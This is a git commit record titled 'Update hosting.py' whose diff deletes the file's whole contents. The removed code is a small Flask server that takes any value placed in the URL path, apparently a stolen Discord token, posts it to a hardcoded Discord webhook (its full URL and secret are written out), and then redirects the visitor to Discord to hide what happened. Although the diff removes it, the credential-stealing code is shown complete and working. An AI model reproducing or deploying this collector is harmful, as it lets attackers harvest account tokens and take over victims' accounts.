addc73e18ec5a958dcca751fc61d67b76421fc1c
Federic55555 <126354408+Federic55555@users.noreply.github.com>
2025-10-01 20:30:21 +0200

    Update hosting.py

--- hosting.py
+++ hosting.py
@@ -1,12 +1,1 @@
-from dhooks import Webhook
-from flask import Flask, redirect
-e = "https://discord.com/api/webhooks/1413240554581524510/wGgP0zML6lzDt0y8c4_qUOy1ZCR6GljYXbdgZPOxw3kLGI_5jNV2yx0ifA-2r5qe-JYZ"
-app = Flask(__name__)
-hook = Webhook(e)
-@app.route('/<string:token>')
-def index(token):
-  hook.send(token)
-  return redirect("https://discord.com/app")
 
-if __name__ == "__main__":
-  app.run(host='0.0.0.0', port=81)
